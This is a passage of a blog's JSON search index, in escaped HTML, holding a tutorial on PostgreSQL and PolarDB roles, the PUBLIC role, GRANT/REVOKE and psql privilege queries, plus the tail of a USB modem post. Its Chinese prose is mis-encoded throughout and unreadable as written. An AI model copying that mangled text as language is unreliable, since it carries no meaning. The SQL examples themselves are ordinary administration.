class=\"s2\"\u003e\u0026#34;1446\u0026#34;\u003c/span\u003e, \u003cspan class=\"nv\"\u003eRUN\u003c/span\u003e\u003cspan class=\"o\"\u003e+=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;usb_modeswitch \u0026#39;%b/%k\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿™æ ·å°±æå®šäº†ï¼Œå¾—äºæå‰å‘ç°äº†è¿™é—®é¢˜ï¼Œå¦åˆ™è·‘åˆ°å›½å¤–å†å‘ç°ï¼Œå°±æ™šäº†ï¼\u003c/p\u003e","title":"voipçš„lsusbæ£€æµ‹åä¸ºçŒ«æ£’usbåœ°å€æ¥å›è·³åŠ¨"},{"content":"å…¬å¸é€‰ç”¨äº†é˜¿é‡Œäº‘çš„PolarDBåšæ•°æ®åº“ï¼Œè¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯Postgreså¢åŠ äº†å¤–æŒ‚ï¼Œå¯ä»¥æ”¯æŒOracleè¯­æ³•ã€‚\næ²¡åŠæ³•ï¼Œå¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹Postgresçš„ç”¨æˆ·ç®¡ç†äº†ã€‚\nPostgreSQLæƒé™æ¶æ„æ˜¯å®å¡”å½¢ç»“æ„\næœ€ä¸Šå±‚æ˜¯å®ä¾‹\nå®ä¾‹ä¸­å…è®¸åˆ›å»ºå¤šä¸ªæ•°æ®åº“\næ¯ä¸ªæ•°æ®åº“ä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªschemaï¼Œ\næ¯ä¸ªschemaä¸‹é¢å¯ä»¥åˆ›å»ºå¤šä¸ªå¯¹è±¡ã€‚\nå¯¹è±¡åŒ…æ‹¬è¡¨ã€ç‰©åŒ–è§†å›¾ã€æ“ä½œç¬¦ã€ç´¢å¼•ã€è§†å›¾ã€åºåˆ—ã€å‡½æ•°ã€â€¦ ç­‰ç­‰ã€‚\nä¸Šé¢schemaä¸­æœ‰ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œpublicï¼Œæ³¨æ„ï¼šæ˜¯å°å†™ã€‚\nå…ˆæ€»ç»“ï¼šPUBLICæ˜¯ç¼ºçœçš„æƒé™ï¼Œä»£è¡¨æ‰€æœ‰äººçš„æ„æ€ï¼ˆæ˜¯ä¸ªè§’è‰²ï¼‰ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œå…è®¸PUBLICè§’è‰²(å¤§å†™)è¿æ¥ï¼Œå³å…è®¸ä»»ä½•äººè¿æ¥ã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°æ®åº“åœ¨åˆ›å»ºåï¼Œä¸å…è®¸é™¤äº†è¶…çº§ç”¨æˆ·å’Œowneræ‰€æœ‰è€…ä¹‹å¤–çš„ä»»ä½•äººåœ¨æ•°æ®åº“ä¸­åˆ›å»ºschemaã€‚\né»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œä¼šè‡ªåŠ¨åˆ›å»ºåä¸º public çš„schemaï¼Œè¿™ä¸ªschemaçš„allæƒé™å·²ç»èµ‹äºˆç»™PUBLICè§’è‰²ï¼ˆæ³¨æ„æ˜¯å¤§å†™ï¼‰ï¼Œå³å…è®¸ä»»ä½•äººåœ¨é‡Œé¢åˆ›å»ºå¯¹è±¡ã€‚\nschemaçº§åˆ«çš„æƒé™ï¼ŒåŒ…æ‹¬å…è®¸æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡(USAGE)ï¼Œä»¥åŠå…è®¸åœ¨schemaä¸­åˆ›å»ºå¯¹è±¡(CREATE)ã€‚\né»˜è®¤æƒ…å†µä¸‹æ–°å»ºçš„schemaçš„æƒé™ä¸ä¼šèµ‹äºˆç»™PUBLICè§’è‰²ï¼Œå› æ­¤é™¤äº†è¶…çº§ç”¨æˆ·å’Œownerï¼Œä»»ä½•äººéƒ½æ²¡æœ‰æƒé™æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡æˆ–è€…åœ¨schemaä¸­æ–°å»ºå¯¹è±¡ã€‚\nä¸¾ä¾‹æ¥è¯´ï¼Œå»ºäº†ä¸ªåº“ï¼Œåˆå»ºäº†ç”¨æˆ·ï¼Œæ²¡ç»™è¿™ä¸ªç”¨æˆ·èµ‹äºˆä»»ä½•æƒé™ã€‚ç¼ºçœä»–å°±ä»PUBLICè§’è‰²ç»§æ‰¿äº†å¯¹åº“é‡Œçš„schema.pulicæƒé™ï¼Œå¯ä»¥è¿æ¥åˆ°è¿™ä¸ªschema.pulicï¼Œå¹¶ä¸”åœ¨è¿™é‡Œå»ºä¸´æ—¶è¡¨ã€å»ºè¡¨ã€viewç­‰ç­‰å¯¹è±¡ï¼Œä½†æ˜¯æ²¡åŠæ³•å»ºç«‹å…¶å®ƒschemaã€‚\nPostgreSQLçš„æ¨¡å¼ï¼ˆSCHEMAï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªè¡¨çš„é›†åˆã€‚\nä¸€ä¸ªæ¨¡å¼å¯ä»¥åŒ…å«è§†å›¾ã€ç´¢å¼•ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ“ä½œç¬¦ç­‰ã€‚\nå†æ¥è¯´è§’è‰²ï¼š\nåœ¨æ•°æ®åº“ä¸­æ‰€æœ‰çš„æƒé™éƒ½å’Œè§’è‰²æŒ‚é’©ã€‚\nè§’è‰²å’Œç”¨æˆ·çš„å”¯ä¸€åŒºåˆ«åœ¨äºï¼Œè§’è‰²æ˜¯nologinçš„ï¼Œè€Œç”¨æˆ·å…è®¸loginï¼Œä»…æ­¤è€Œå·²ã€‚\nè€Œ\u0026quot;PUBLIC\u0026quot;æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è§’è‰²ï¼Œä»£è¡¨ç€æ‰€æœ‰äººã€‚\né‚£åˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼š\næ¯ä¸ªPostgreSQLå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸ºâ€œæ‰€æœ‰è€…â€çš„ç‰¹æ®Šè§’è‰²ã€‚åªæœ‰æ‰€æœ‰è€…æ‰èƒ½æ‰§è¡ŒæŸäº›æ“ä½œï¼Œå¦‚ ALTER TABLE ï¼Œè€Œä½ ä¸èƒ½å°†è¿™æ ·çš„æƒé™æˆäºˆéæ‰€æœ‰è€…ã€‚\né‚£ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªäººå¯ä»¥alterè¡¨ç»“æ„å§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è§’è‰²ç»§æ‰¿æ¥è§£å†³æ­¤é—®é¢˜ã€‚åˆ›å»º table_owner è§’è‰²å¹¶ä¸” GRANT table_owner TO user1, user2 ï¼ˆuser1å’Œuser2ç»§æ‰¿table_owner)ï¼Œç„¶åèµ‹æƒ ALTER TABLE my_table OWNER TO table_owner èµ‹äºˆtable_owneræ‰€æœ‰è€…è§’è‰²ã€‚ç°åœ¨è¡¨çš„æ‰€æœ‰è€…æ˜¯ table_owner äº†ï¼Œä½†æ˜¯å› ä¸º user1 å’Œ user2 æ˜¯è¯¥è§’è‰²çš„æˆå‘˜ï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå…·æœ‰ç»§æ‰¿æƒé™æ¥è¿è¡Œ ALTER TABLEäº†ï¼Œå¦‚ä¸‹å›¾ ã€‚\nå•°å—¦äº†è¿™ä¹ˆå¤šï¼Œé™¤äº†ä¿®æ”¹pg_hba.confï¼Œèµ‹æƒçš„å‘½ä»¤å°±ä¸¤æ¡ï¼Œgrantå’Œrevokeï¼Œçœ‹ä¸‹å›¾ï¼š\nè¿›å…¥å®æˆ˜ï¼Œé¦–å…ˆä»ä¸Šåˆ°ä¸‹éƒ½çœ‹ä¸€çœ‹ï¼Œæœ‰ä»€ä¹ˆåº“ï¼Œæœ‰ä»€ä¹ˆschemaï¼Œæœ‰ä»€ä¹ˆå¯¹è±¡ï¼Œæœ‰ä»€ä¹ˆè¡¨ï¼Œæœ‰ä»€ä¹ˆç´¢å¼•ï¼Œæœ‰ä»€ä¹ˆè§’è‰²ï¼š\n#æ¨èç”¨psqlæ¥è¿›è¡Œç®¡ç†ï¼Œæœ‰å¾ˆå¤šå¿«æ·é”®ï¼Œnavicaté‡Œé¢æ˜¯æ²¡æœ‰çš„ #æ²¡æœ‰çš„è¯å°±è£…ä¸€ä¸ª yum install postgresql.x86_64 psql -h 10.8.2.61 -U admin #å¿…ç”¨å¿«æ·é”® #åˆ—å‡ºæ‰€æœ‰çš„åº“ \\l #åˆ—å‡ºæ‰€æœ‰çš„schema \\dn #çœ‹schema.publicæƒé™ \\dn+ public #åˆ—å‡ºæ‰€æœ‰çš„å¯¹è±¡ï¼ˆtable, view, sequencesï¼‰ \\d #åˆ—å‡ºæ‰€æœ‰çš„è§’è‰² \\du #åˆ—å‡ºæ‰€æœ‰è¡¨ \\dt #åˆ—å‡ºæ‰€æœ‰ç´¢å¼• \\di #åŒæ ·çš„sql select * from pg_roles; #çœ‹çœ‹èƒ½ç™»å½•çš„ç”¨æˆ·æœ‰å“ªäº› select * from pg_user; é‚£è‡ªé¡¶å‘ä¸‹å¼€å§‹ï¼š\n#å»ºç«‹boms_adminè§’è‰²ï¼šéè¶…çº§ç”¨æˆ·+å¯ä»¥å»ºç«‹db+å¯ä»¥å»ºç«‹role+å¯ä»¥æŠŠæƒé™ç»§æ‰¿ç»™åˆ«äºº create role boms_admin nosuperuser createdb createrole inherit; #å»ºç«‹ç”¨æˆ·ï¼Œç»§æ‰¿bomsuserçš„æƒé™ï¼Œå¯ä»¥ç™»å½•ï¼Œæœ‰å¯†ç  CREATE role bomsuser in role boms_admin login password â€˜passwordâ€™; #å»ºç«‹åº“ï¼Œowneræ˜¯boms_admin create database bomsdb owner boms_admin; #ç”¨æ–°ç”¨æˆ·è¿æ¥æ–°çš„DBï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç”¨è¶…çº§ç”¨æˆ·è¿æ¥ï¼Œè¿™ä¸¤äººéƒ½æœ‰æƒé™ \\c bomsdb bomsuser; \\c bomsdb superuser; #å…ˆå»ºç«‹ä¸ªschemaï¼Œå¹¶ä¸”åœ¨schemaé‡Œå»ºä¸ªè¡¨ create schema zrr; create table zrr.test (x integer); insert into zrr.test values (1),(2),(3); select * from zrr.test; #å¬å›PUBLICå¯ä»¥åœ¨æ•°æ®åº“çº§åˆ«ä¸­database testä¸­è¿æ¥ã€ä½¿ç”¨ä¸´æ—¶è¡¨çš„æƒé™ revoke connect, temporary on database bomsdb from public; #å¬å›PUBLICå¯ä»¥åœ¨schemaçº§åˆ«ä¸­å¯ä»¥USAGEä½¿ç”¨å’ŒCREATEå»ºç«‹çš„æƒé™ï¼Œæ³¨æ„ï¼Œä½ ç°åœ¨è¿æ¥çš„æ˜¯å“ªä¸ªåº“ï¼Œå¬å›çš„å°±æ˜¯å“ªä¸ªåº“çš„public #è¿™é‡Œè¿çš„æ˜¯bomsdbåº“ï¼Œå¬å›çš„å°±æ˜¯è¿™ä¸ªåº“é‡Œçš„schema.public REVOKE USAGE, CREATE ON SCHEMA public FROM public; #è¿™æ ·æ“ä½œä¹‹ååªæœ‰ownerå’Œsuperuserå¯ä»¥ç”¨è¿™ä¸ªdatabaseäº† #æˆ‘ä»¬å¿…é¡»æ˜¾å¼èµ‹æƒæ‰å¯ä»¥è¿ä¸Šå¹¶ä¸”å»ºåº“äº† #å»ºä¸ªæ–°ç”¨æˆ· create user testuser login password â€˜password\u0026#39;; #èµ‹è¿æ¥æƒé™ï¼Œèµ‹äºˆä¸€ä¸ªè¡¨çš„åªè¯»æƒé™ grant connect on database bomsdb to testuser; grant usage on schema zrr to testuser; grant select on table zrr.test to testuser; #è¿æ¥ä¸Šå»ï¼Œæµ‹ä¸€ä¸‹ \\c bomsdb testuser; select * from zrr.test; ä¸¤ä¸ªè„šæœ¬ï¼š\nAã€çœ‹ç”¨æˆ·test1éƒ½æœ‰å•¥è¡¨æƒé™\nSELECT grantee,table_schema,table_name, string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type FROM information_schema.role_table_grants where grantee=\u0026#39;test1\u0026#39; group by table_name,table_schema,grantee; Bã€çœ‹è¡¨xxxéƒ½æ˜¯ä»€ä¹ˆç”¨æˆ·æ‰æœ‰æƒé™\nSELECT grantee,table_schema,table_name,string_agg( privilege_type,\u0026#39;, \u0026#39; ) as privilege_type FROM information_schema.role_table_grants WHERE table_name=\u0026#39;xxx\u0026#39; group by grantee,table_schema,table_name; æç¤ºæ— æƒé™çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨ä»¥ä¸‹å‡½æ•°æ¥æ£€æŸ¥\nselect has_database_privilege(user, database, privilege); select has_schema_privilege(user, schema, privilege); select has_table_privilege(user, table, privilege); å¤ªè´¹åŠ²äº†ï¼ŒèŠ±äº†ä¸¤å¤©æ—¶é—´æ‰ç®—å¤§æ¦‚ææ˜ç™½ã€‚\nå†ç»™ä¸ªåˆå§‹çš„ç›´ç™½è§£é‡Šè„šæœ¬ï¼š\næ¦‚å¿µç¥ï¼š\nä¸€ã€æƒé™ç®¡ç†åœ¨ PostgreSQL ä¸­æ˜¯é€’å½’å’Œåˆ†å±‚çš„ï¼Œå› æ­¤éœ€è¦åˆ†åˆ«ç®¡ç†1ã€æ•°æ®åº“ã€2ã€æ¨¡å¼ï¼Œ3ã€ä»¥åŠæ¨¡å¼ä¸­çš„å…·ä½“å¯¹è±¡ï¼ˆå¦‚è¡¨ï¼‰ã€‚ä¸‰ç§çº§åˆ«ä¸­çš„æƒé™ã€‚ äºŒã€PostgreSQL çš„æƒé™æ¨¡å‹æ˜¯ç´¯åŠ çš„ã€‚ #é¦–å…ˆç”¨adminç™»å½• #å»ºç«‹ä¸€ä¸ªåº“ CREATE DATABASE test; #è¿™æ—¶å€™schema.publicç›´æ¥å°±è¢«å»ºç«‹äº†ï¼Œè€Œä¸”PUBLICç›´æ¥èµ‹æƒäº† #è¿™æ—¶å€™å»\\dn+ public \\dn+ public List of schemas Name | Owner | Access privileges | Description --------+---------+--------------------+------------------------ public | dbadmin | dbadmin=UC/dbadmin+| standard public schema | | =UC/dbadmin | #ä¸Šé¢å‘½ä»¤å¯ä»¥çœ‹åˆ°åªæœ‰dbadminæ˜¯Ownerï¼Œä¸”æƒé™æ˜¯UC #ä½†å®é™…ä»PGadminé‡Œé¢çœ‹ï¼Œè¿˜æœ‰ä¸ªPUBLIC UCï¼ˆUSAGE+CREATE)çš„æƒé™ï¼Œç¼ºçœå°±èµ‹äºˆäº† #ä¸‹é¢ä¸€å¥è™½ç„¶å¬å›äº†publicå¯¹åº“çš„æƒé™ï¼Œä½†æ˜¯ï¼Œå»ºåº“å°±ç¼ºçœæœ‰çš„PUBLICå¯¹schemaçš„æƒé™ä¸ä¼šæ¶ˆå¤± #å› ä¸ºpostgresçš„æƒé™æœºåˆ¶æ˜¯ç´¯åŠ æœºåˆ¶ #å› æ­¤ï¼Œä½ æ’¤é”€äº†æ•°æ®åº“å±‚é¢çš„æƒé™ï¼Œä½†æ²¡æœ‰è§¦åŠ public schema æœ¬èº«çš„æƒé™ã€‚ REVOKE ALL ON DATABASE test FROM public; #å»ºç«‹è§’è‰²ç»„ï¼Œå¹¶ä¸”å¯ä»¥è¿æ¥åˆ°æ•°æ®åº“ï¼Œåœ¨åº“çº§åˆ«èµ‹äºˆæ‰€æœ‰æƒé™ #ä¾ç„¶åªä¼šå åŠ ï¼Œä¸ä¼šå½±å“åˆ°public schemaçš„æƒé™ CREATE ROLE test_project; GRANT CONNECT ON DATABASE test TO test_project; GRANT ALL PRIVILEGES ON DATABASE test TO test_project; #å»ºç«‹è§’è‰²ï¼ŒæŠŠè§’è‰²ç»„çš„æƒé™ç»™è§’è‰²ï¼Œå°±æå®šäº† CREATE ROLE test LOGIN PASSWORD \u0026#39;lankutest\u0026#39;; GRANT test_project TO test; è¡¥å……ï¼š\nPUBLIC å’Œ publicï¼ˆæœªåŠ å¼•å·ï¼‰æ˜¯ç­‰ä»·çš„ï¼Œåœ¨ PostgreSQL ä¸Šå¤§å°å†™ä¸æ•æ„Ÿã€‚ \u0026quot;PUBLIC\u0026quot;ï¼ˆåŠ åŒå¼•å·ï¼‰ä¼šè¢«çœ‹ä½œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œé PostgreSQL é¢„å®šä¹‰çš„ PUBLIC è§’è‰²ã€‚ PUBLIC æ˜¯ PostgreSQL çš„ç‰¹æ®Šä¿ç•™è§’è‰²ï¼Œä»£è¡¨æ‰€æœ‰ç”¨æˆ·ï¼Œä¸èƒ½ç›´æ¥åˆ›å»ºæˆ–ç®¡ç†ï¼Œä¹Ÿä¸ä¼šå‡ºç°åœ¨ pg_roles ä¸­ã€‚ å†è¡¥å……ä¸€ä¸‹ï¼Œå¦‚æœå°±æ˜¯å»ºä¸€ä¸ªç”¨æˆ·ï¼Œç„¶åå¯¹ä¸€ä¸ªåº“æœ‰æƒé™ï¼Œç®€å•äº†\n# ç”Ÿæˆå¯†ç  tr -cd \u0026#39;[:alnum:]\u0026#39; \u0026lt; /dev/urandom | fold -w \u0026#34;21\u0026#34; | head -n 1 # å»ºç”¨æˆ·å’Œåº“ CREATE USER \u0026#34;work-booking\u0026#34; WITH PASSWORD \u0026#39;xxxxxxxx\u0026#39;; CREATE DATABASE \u0026#34;work-booking\u0026#34; OWNER \u0026#34;work-booking\u0026#34;; ","permalink":"https://rendoumi.com/posts/20240205-postgres_user_manager/","summary":"\u003cp\u003eå…¬å¸é€‰ç”¨äº†é˜¿é‡Œäº‘çš„PolarDBåšæ•°æ®åº“ï¼Œè¿™ä¸ªä¸œè¥¿å…¶å®å°±æ˜¯Postgreså¢åŠ äº†å¤–æŒ‚ï¼Œå¯ä»¥æ”¯æŒOracleè¯­æ³•ã€‚\u003c/p\u003e\n\u003cp\u003eæ²¡åŠæ³•ï¼Œå¾—ä»”ç»†ç ”ç©¶ä¸€ä¸‹Postgresçš„ç”¨æˆ·ç®¡ç†äº†ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003ePostgreSQLæƒé™æ¶æ„æ˜¯å®å¡”å½¢ç»“æ„\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæœ€ä¸Šå±‚æ˜¯å®ä¾‹\u003c/p\u003e\n\u003cp\u003eå®ä¾‹ä¸­å…è®¸åˆ›å»ºå¤šä¸ªæ•°æ®åº“\u003c/p\u003e\n\u003cp\u003eæ¯ä¸ªæ•°æ®åº“ä¸­å¯ä»¥åˆ›å»ºå¤šä¸ªschemaï¼Œ\u003c/p\u003e\n\u003cp\u003eæ¯ä¸ªschemaä¸‹é¢å¯ä»¥åˆ›å»ºå¤šä¸ªå¯¹è±¡ã€‚\u003c/p\u003e\n\u003cp\u003eå¯¹è±¡åŒ…æ‹¬è¡¨ã€ç‰©åŒ–è§†å›¾ã€æ“ä½œç¬¦ã€ç´¢å¼•ã€è§†å›¾ã€åºåˆ—ã€å‡½æ•°ã€â€¦ ç­‰ç­‰ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205103517867\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205103517867.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸Šé¢schemaä¸­æœ‰ä¸ªå¥‡æ€ªçš„ä¸œè¥¿ï¼Œpublicï¼Œæ³¨æ„ï¼šæ˜¯å°å†™ã€‚\u003c/p\u003e\n\u003cp\u003eå…ˆæ€»ç»“ï¼šPUBLICæ˜¯ç¼ºçœçš„æƒé™ï¼Œä»£è¡¨æ‰€æœ‰äººçš„æ„æ€ï¼ˆæ˜¯ä¸ªè§’è‰²ï¼‰ã€‚\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œå…è®¸PUBLICè§’è‰²(å¤§å†™)è¿æ¥ï¼Œå³å…è®¸ä»»ä½•äººè¿æ¥ã€‚\u003c/p\u003e\n\u003cp\u003eé»˜è®¤æƒ…å†µä¸‹ï¼Œæ•°æ®åº“åœ¨åˆ›å»ºåï¼Œä¸å…è®¸é™¤äº†è¶…çº§ç”¨æˆ·å’Œowneræ‰€æœ‰è€…ä¹‹å¤–çš„ä»»ä½•äººåœ¨æ•°æ®åº“ä¸­åˆ›å»ºschemaã€‚\u003c/p\u003e\n\u003cp\u003eé»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨åˆ›å»ºæ•°æ®åº“ä¹‹åï¼Œä¼šè‡ªåŠ¨åˆ›å»ºåä¸º public çš„schemaï¼Œè¿™ä¸ªschemaçš„allæƒé™å·²ç»èµ‹äºˆç»™PUBLICè§’è‰²ï¼ˆæ³¨æ„æ˜¯å¤§å†™ï¼‰ï¼Œå³å…è®¸ä»»ä½•äººåœ¨é‡Œé¢åˆ›å»ºå¯¹è±¡ã€‚\u003c/p\u003e\n\u003cp\u003eschemaçº§åˆ«çš„æƒé™ï¼ŒåŒ…æ‹¬å…è®¸æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡(USAGE)ï¼Œä»¥åŠå…è®¸åœ¨schemaä¸­åˆ›å»ºå¯¹è±¡(CREATE)ã€‚\u003c/p\u003e\n\u003cp\u003eé»˜è®¤æƒ…å†µä¸‹æ–°å»ºçš„schemaçš„æƒé™ä¸ä¼šèµ‹äºˆç»™PUBLICè§’è‰²ï¼Œå› æ­¤é™¤äº†è¶…çº§ç”¨æˆ·å’Œownerï¼Œä»»ä½•äººéƒ½æ²¡æœ‰æƒé™æŸ¥çœ‹schemaä¸­çš„å¯¹è±¡æˆ–è€…åœ¨schemaä¸­æ–°å»ºå¯¹è±¡ã€‚\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003eä¸¾ä¾‹æ¥è¯´ï¼Œå»ºäº†ä¸ªåº“ï¼Œåˆå»ºäº†ç”¨æˆ·ï¼Œæ²¡ç»™è¿™ä¸ªç”¨æˆ·èµ‹äºˆä»»ä½•æƒé™ã€‚ç¼ºçœä»–å°±ä»PUBLICè§’è‰²ç»§æ‰¿äº†å¯¹åº“é‡Œçš„schema.pulicæƒé™ï¼Œå¯ä»¥è¿æ¥åˆ°è¿™ä¸ªschema.pulicï¼Œå¹¶ä¸”åœ¨è¿™é‡Œå»ºä¸´æ—¶è¡¨ã€å»ºè¡¨ã€viewç­‰ç­‰å¯¹è±¡ï¼Œä½†æ˜¯æ²¡åŠæ³•å»ºç«‹å…¶å®ƒschemaã€‚\u003c/p\u003e\n\u003cp\u003ePostgreSQLçš„æ¨¡å¼ï¼ˆSCHEMAï¼‰å¯ä»¥çœ‹ä½œæ˜¯ä¸€ä¸ªè¡¨çš„é›†åˆã€‚\u003c/p\u003e\n\u003cp\u003eä¸€ä¸ªæ¨¡å¼å¯ä»¥åŒ…å«è§†å›¾ã€ç´¢å¼•ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ“ä½œç¬¦ç­‰ã€‚\u003c/p\u003e\n\u003cp\u003eå†æ¥è¯´è§’è‰²ï¼š\u003c/p\u003e\n\u003cp\u003eåœ¨æ•°æ®åº“ä¸­æ‰€æœ‰çš„æƒé™éƒ½å’Œè§’è‰²æŒ‚é’©ã€‚\u003c/p\u003e\n\u003cp\u003eè§’è‰²å’Œç”¨æˆ·çš„å”¯ä¸€åŒºåˆ«åœ¨äºï¼Œè§’è‰²æ˜¯\u003ccode\u003enologin\u003c/code\u003eçš„ï¼Œè€Œç”¨æˆ·å…è®¸\u003ccode\u003elogin\u003c/code\u003eï¼Œä»…æ­¤è€Œå·²ã€‚\u003c/p\u003e\n\u003cp\u003eè€Œ\u0026quot;PUBLIC\u0026quot;æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„è§’è‰²ï¼Œä»£è¡¨ç€æ‰€æœ‰äººã€‚\u003c/p\u003e\n\u003cp\u003eé‚£åˆæœ‰ä¸€ä¸ªé—®é¢˜ï¼š\u003c/p\u003e\n\u003cp\u003eæ¯ä¸ª\u003ccode\u003ePostgreSQL\u003c/code\u003eå¯¹è±¡éƒ½æœ‰ä¸€ä¸ªåä¸ºâ€œæ‰€æœ‰è€…â€çš„ç‰¹æ®Šè§’è‰²ã€‚åªæœ‰æ‰€æœ‰è€…æ‰èƒ½æ‰§è¡ŒæŸäº›æ“ä½œï¼Œå¦‚ \u003ccode\u003eALTER TABLE\u003c/code\u003e ï¼Œè€Œä½ ä¸èƒ½å°†è¿™æ ·çš„æƒé™æˆäºˆéæ‰€æœ‰è€…ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£ä¸å¯èƒ½åªæœ‰ä¸€ä¸ªäººå¯ä»¥alterè¡¨ç»“æ„å§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è§’è‰²ç»§æ‰¿æ¥è§£å†³æ­¤é—®é¢˜ã€‚åˆ›å»º \u003ccode\u003etable_owner\u003c/code\u003e è§’è‰²å¹¶ä¸” \u003ccode\u003eGRANT table_owner TO user1, user2\u003c/code\u003e ï¼ˆuser1å’Œuser2ç»§æ‰¿table_owner)ï¼Œç„¶åèµ‹æƒ \u003ccode\u003eALTER TABLE my_table OWNER TO table_owner\u003c/code\u003e èµ‹äºˆ\u003ccode\u003etable_owner\u003c/code\u003eæ‰€æœ‰è€…è§’è‰²ã€‚ç°åœ¨è¡¨çš„æ‰€æœ‰è€…æ˜¯ \u003ccode\u003etable_owner\u003c/code\u003e äº†ï¼Œä½†æ˜¯å› ä¸º \u003ccode\u003euser1\u003c/code\u003e å’Œ \u003ccode\u003euser2\u003c/code\u003e æ˜¯è¯¥è§’è‰²çš„æˆå‘˜ï¼Œæ‰€ä»¥ä»–ä»¬ä¹Ÿå…·æœ‰ç»§æ‰¿æƒé™æ¥è¿è¡Œ \u003ccode\u003eALTER TABLE\u003c/code\u003eäº†ï¼Œå¦‚ä¸‹å›¾ ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205113508881\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205113508881.png\"\u003e\u003c/p\u003e\n\u003cp\u003eå•°å—¦äº†è¿™ä¹ˆå¤šï¼Œé™¤äº†ä¿®æ”¹pg_hba.confï¼Œèµ‹æƒçš„å‘½ä»¤å°±ä¸¤æ¡ï¼Œ\u003ccode\u003egrant\u003c/code\u003eå’Œ\u003ccode\u003erevoke\u003c/code\u003eï¼Œçœ‹ä¸‹å›¾ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240205103610366\" loading=\"lazy\" src=\"/posts/20240205-postgres_user_manager/image-20240205103610366.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¿›å…¥å®æˆ˜ï¼Œé¦–å…ˆä»ä¸Šåˆ°ä¸‹éƒ½çœ‹ä¸€çœ‹ï¼Œæœ‰ä»€ä¹ˆåº“ï¼Œæœ‰ä»€ä¹ˆschemaï¼Œæœ‰ä»€ä¹ˆå¯¹è±¡ï¼Œæœ‰ä»€ä¹ˆè¡¨ï¼Œæœ‰ä»€ä¹ˆç´¢å¼•ï¼Œæœ‰ä»€ä¹ˆè§’è‰²ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ¨èç”¨psqlæ¥è¿›è¡Œç®¡ç†ï¼Œæœ‰å¾ˆå¤šå¿«æ·é”®ï¼Œnavicaté‡Œé¢æ˜¯æ²¡æœ‰çš„\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ²¡æœ‰çš„è¯å°±è£…ä¸€ä¸ª\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install postgresql.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsql -h 10.8.2.61 -U admin \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¿…ç”¨å¿«æ·é”®\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#åˆ—å‡ºæ‰€æœ‰çš„åº“\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\l\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 